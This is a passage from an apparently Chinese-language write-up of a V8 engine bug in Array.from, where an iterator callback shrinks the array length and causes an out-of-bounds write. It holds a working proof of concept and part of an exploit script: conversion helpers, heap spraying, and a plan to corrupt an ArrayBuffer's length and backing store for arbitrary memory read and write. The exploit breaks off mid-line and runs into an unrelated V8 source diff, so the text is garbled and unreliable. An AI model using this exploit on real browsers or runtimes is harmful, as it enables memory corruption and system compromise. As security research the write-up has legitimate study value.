     // Finally set the length on the output and return it.
      GenerateSetLength(context, array.value(), length.value());
而`GenerateSetLength`函数将迭代次数与原来的数组长度进行对比，如果比原来的小，就调用js层的`SetProperty`函数将arr的length设置，否则直接将length值写入。这里看似没有什么问题，但是问题就发生在回调的逻辑里，这里是假设了array对象的length和迭代次数`同步的递增`，我们可以在迭代回调函数里趁机把array对象的length给改小，然后进入`GenerateSetLength(context,
array.value(), length.value())`函数时就可以绕过`GotoIf(SmiLessThan(length_smi,
old_length),
&runtime);`函数，直接将迭代次数设置为array对象的length。调用`SetProperty`和使用`StoreObjectFieldNoWriteBarrier(fast_array,
JSArray::kLengthOffset,
length_smi);`来设置length的不同之处在于`SetProperty`是js层的，调用它来设置会顺便将elements扩容或收缩，而`StoreObjectFieldNoWriteBarrier(fast_array,
JSArray::kLengthOffset, length_smi);`函数不回调，直接在内存里写上这个值。因此，不扩容，就造成了溢出。
####  漏洞利用
POC
    let arr = [1.1];
    Array.from.call(function() { return arr }, {[Symbol.iterator] : _ => (
      {
        counter : 0,
        next() {
          let result = this.counter++;
          if (this.counter > 10) {
            arr.length = 1;
            return {done: true};
          } else {
            return {value: result, done: false};
          }
        }
      }
    ) });
    %DebugPrint(arr);
    %SystemBreak();
可以看到length为10，然而elements的长度值却为1
由此，我们利用溢出，改写ArrayBuffer的length和backing_store即可实现任意地址读写  
exp
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    function i2f64(value) {
       dv.setBigUint64(0,BigInt(value),true);
       return dv.getFloat64(0,true);
    }
    function u64_l(value) {
       dv.setFloat64(0,value,true);
       return dv.getUint32(0,true);
    }
    function u64_h(value) {
       dv.setFloat64(0,value,true);
       return dv.getUint32(4,true);
    }
    let obj = {};
    var spray_size = 0x1000;
    var arr = new Array(spray_size);
    let oobArray = [];
    //转为double array
    oobArray[0] = 1.1;
    oobArray.length = 0;
    let maxSize = 1024*8;
    Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
      {
        counter : 0,
        next() {
          let result = this.counter++;
          if (this.counter > maxSize) {
            oobArray.length = 0x1;
            //堆喷
            for (var i=0;i
    -      BuiltinResultGenerator;
    +        to_(this, MachineRepresentation::kTagged, SmiConstant(0)),
    +        fully_spec_compliant_(this, {&k_, &a_, &to_}) {}
       typedef std::function
    -      BuiltinResultIndexInitializer;
    +      BuiltinResultGenerator;
       typedef std::function
    @@ -30,7 +28,7 @@
       typedef std::function
           PostLoopAction;
    -  Node* ForEachResultGenerator() { return UndefinedConstant(); }
    +  void ForEachResultGenerator() { a_.Bind(UndefinedConstant()); }
       Node* ForEachProcessor(Node* k_value, Node* k) {
         CallJS(CodeFactory::Call(isolate()), context(), callbackfn(), this_arg(),
    @@ -38,7 +36,7 @@
         return a();
       }
    -  Node* SomeResultGenerator() { return FalseConstant(); }
    +  void SomeResultGenerator() { a_.Bind(FalseConstant()); }
       Node* SomeProcessor(Node* k_value, Node* k) {
         Node* value = CallJS(CodeFactory::Call(isolate()), context(), callbackfn(),
    @@ -51,7 +49,7 @@
         return a();
       }
    -  Node* EveryResultGenerator() { return TrueConstant(); }
    +  void EveryResultGenerator() { a_.Bind(TrueConstant()); }
       Node* EveryProcessor(Node* k_value, Node* k) {
         Node* value = CallJS(CodeFactory::Call(isolate()), context(), callbackfn(),
    @@ -64,7 +62,7 @@
         return a();
       }
    -  Node* ReduceResultGenerator() { return this_arg(); }
    +  void ReduceResultGenerator() { return a_.Bind(this_arg()); }
       Node* ReduceProcessor(Node* k_value, Node* k) {
         VARIABLE(result, MachineRepresentation::kTagged);
    @@ -91,9 +89,9 @@
         BIND(&ok);
       }
    -  Node* FilterResultGenerator() {
    +  void FilterResultGenerator() {
         // 7. Let A be ArraySpeciesCreate(O, 0).
    -    return ArraySpeciesCreate(context(), o(), SmiConstant(0));
    +    a_.Bind(ArraySpeciesCreate(context(), o(), SmiConstant(0)));
       }
       Node* FilterProcessor(Node* k_value, Node* k) {
    @@ -162,13 +160,53 @@
         return a();
       }
    -  Node* MapResultGenerator() {
    -    // 5. Let A be ? ArraySpeciesCreate(O, len).
    -    return ArraySpeciesCreate(context(), o(), len_);
    +  void MapResultGenerator() {
    +    Label runtime(this), done(this, {&a_});
    +    GotoIf(DoesntHaveInstanceType(o(), JS_ARRAY_TYPE), &runtime);
    +    Node* o_map = LoadMap(o());
    +    Node* const initial_array_prototype = LoadContextElement(
    +        LoadNativeContext(context()), Context::INITIAL_ARRAY_PROTOTYPE_INDEX);
    +    Node* proto = LoadMapPrototype(o_map);
    +    GotoIf(WordNotEqual(proto, initial_array_prototype), &runtime);
    +
    +    Node* species_protector = SpeciesProtectorConstant();
    +    Node* value = LoadObjectField(species_protector, Cell::kValueOffset);
    +    Node* const protector_invalid = SmiConstant(Isolate::kProtectorInvalid);
    +    GotoIf(WordEqual(value, protector_invalid), &runtime);
    +
    +    Node* const initial_array_constructor = LoadContextElement(
    +        LoadNativeContext(context()), Context::ARRAY_FUNCTION_INDEX);
    +    a_.Bind(ConstructJS(CodeFactory::Construct(isolate()), context(),
    +                        initial_array_constructor, len_));
    +    Goto(&done);
    +
    +    BIND(&runtime);
    +    {
    +      // 5. Let A be ? ArraySpeciesCreate(O, len).
    +      Node* constructor =
    +          CallRuntime(Runtime::kArraySpeciesConstructor, context(), o());
    +      a_.Bind(ConstructJS(CodeFactory::Construct(isolate()), context(),
    +                          constructor, len_));
    +      Goto(&fully_spec_compliant_);
    +    }
    +    BIND(&done);
       }
    -  Node* MapProcessor(Node* k_value, Node* k) {
    -    //  i. Let kValue be ? Get(O, Pk). Performed by the caller of MapProcessor.
    +  Node* SpecCompliantMapProcessor(Node* k_value, Node* k) {
    +    //  i. Let kValue be ? Get(O, Pk). Performed by the caller of
    +    //  SpecCompliantMapProcessor.
    +    // ii. Let mappedValue be ? Call(callbackfn, T, kValue, k, O).
    +    Node* mappedValue = CallJS(CodeFactory::Call(isolate()), context(),
    +                               callbackfn(), this_arg(), k_value, k, o());
    +
    +    // iii. Perform ? CreateDataPropertyOrThrow(A, Pk, mappedValue).
    +    CallRuntime(Runtime::kCreateDataProperty, context(), a(), k, mappedValue);
    +    return a();
    +  }
    +
    +  Node* FastMapProcessor(Node* k_value, Node* k) {
    +    //  i. Let kValue be ? Get(O, Pk). Performed by the caller of
    +    //  FastMapProcessor.
         // ii. Let mappedValue be ? Call(callbackfn, T, kValue, k, O).
         Node* mappedValue = CallJS(CodeFactory::Call(isolate()), context(),
                                    callbackfn(), this_arg(), k_value, k, o());
    @@ -268,8 +306,7 @@
           const CallResultProcessor& processor, const PostLoopAction& action,